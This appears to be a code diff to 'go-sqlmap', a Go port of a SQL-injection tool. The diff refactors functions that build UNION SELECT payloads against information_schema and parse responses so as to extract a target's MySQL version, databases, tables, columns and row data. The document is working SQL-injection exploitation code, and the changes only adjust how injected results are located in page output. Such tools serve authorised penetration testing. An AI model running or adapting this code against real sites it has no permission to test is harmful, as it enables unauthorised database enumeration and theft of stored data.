@@ -2,6 +2,7 @@ package core
 
 import (
 	"bytes"
+	"fmt"
 	"go-sqlmap/constant"
 	"go-sqlmap/log"
 	"go-sqlmap/util"
@@ -70,17 +71,27 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 	res := util.DeleteLastChar(unionSql.String())
 	unionPayload := res + constant.Space + constant.Annotator
 	code, _, tempBody := util.Request(constant.DefaultMethod, unionPayload, nil, nil)
-	if code != -1 {
-	}
-	body := string(tempBody)
 	pos := Pos{}
-	for k, v := range randMap {
-		index := strings.Index(body, strconv.Itoa(v))
-		if index != -1 {
-			pos.Key = k
-			pos.StartIndex = index
-			return pos
+	var tempPosList []Pos
+	if code != -1 {
+		body := string(tempBody)
+		for k, v := range randMap {
+			if !strings.Contains(body, strconv.Itoa(v)) {
+				continue
+			}
+			index := strings.Index(body, strconv.Itoa(v))
+			if index != -1 {
+				tempPos := Pos{}
+				tempPos.Key = k
+				tempPos.StartIndex = index
+				endIndex := index + len(strconv.Itoa(v))
+				tempPos.EndIndexChar = util.GetIndexChar(body, endIndex)
+				fmt.Println(tempPos.EndIndexChar)
+				tempPosList = append(tempPosList, tempPos)
+			}
 		}
+		min := GetMinPos(tempPosList)
+		return min
 	}
 	return pos
 }
@@ -98,9 +109,8 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 	code, _, tempBody := util.Request(constant.DefaultMethod, versionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
-		innerR := []rune(body)
-		innerRes := string(innerR[pos.StartIndex:])
-		result := strings.Split(innerRes, "<")[0]
+		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("MySQL Version:" + result)
 		return result
 	}
@@ -115,15 +125,13 @@ func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
 	for i := 1; i < key; i++ {
 		databaseSql.WriteString(constant.DatabaseFunc + ",")
 	}
-	r := []rune(databaseSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(databaseSql.String())
 	databasePayload := res + constant.Space + constant.Annotator
 	code, _, tempBody := util.Request(constant.DefaultMethod, databasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
-		innerR := []rune(body)
-		innerRes := string(innerR[pos.StartIndex:])
-		result := strings.Split(innerRes, "<")[0]
+		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("current database:" + result)
 		return result
 	}
@@ -138,16 +146,14 @@ func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
 	for i := 1; i < key; i++ {
 		databaseSql.WriteString("group_concat(schema_name),")
 	}
-	r := []rune(databaseSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(databaseSql.String())
 	fromSql := "from%20information_schema.schemata%20"
 	tablePayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
-		innerR := []rune(body)
-		innerRes := string(innerR[pos.StartIndex:])
-		result := strings.Split(innerRes, "<")[0]
+		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get databases success")
 		util.PrintDatabases(util.ConvertString(result))
 		return result
@@ -162,16 +168,14 @@ func GetAllTables(pos Pos, suffix string, url string, key int, database string) 
 	for i := 1; i < key; i++ {
 		tableSql.WriteString("group_concat(table_name),")
 	}
-	r := []rune(tableSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(tableSql.String())
 	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
 	tablePayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
-		innerR := []rune(body)
-		innerRes := string(innerR[pos.StartIndex:])
-		result := strings.Split(innerRes, "<")[0]
+		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get tables success")
 		util.PrintTables(util.ConvertString(result))
 		return result
@@ -187,17 +191,15 @@ func GetColumns(pos Pos, suffix string, url string, key int, database string, ta
 	for i := 1; i < key; i++ {
 		columnSql.WriteString("group_concat(column_name),")
 	}
-	r := []rune(columnSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(columnSql.String())
 	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
 		"'%20and%20table_schema='" + database + "'%20"
 	columnPayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
-		innerR := []rune(body)
-		innerRes := string(innerR[pos.StartIndex:])
-		result := strings.Split(innerRes, "<")[0]
+		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get columns success")
 		util.PrintColumns(util.ConvertString(result))
 		return result
@@ -219,16 +221,14 @@ func GetData(pos Pos, suffix string, url string, key int, database string, table
 		innerRes := string(innerR[:len(innerR)-6])
 		dataSql.WriteString(innerRes + "),")
 	}
-	r := []rune(dataSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(dataSql.String())
 	fromSql := "from%20" + database + "." + tableName
 	columnPayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
-		innerR := []rune(body)
-		innerRes := string(innerR[pos.StartIndex:])
-		result := strings.Split(innerRes, "<")[0]
+		innerRes := util.SubstringFrom(body, pos.StartIndex)
+		result := strings.Split(innerRes, pos.EndIndexChar)[0]
 		log.Info("get data success")
 		var output [][]string
 		for _, v := range strings.Split(result, ",") {
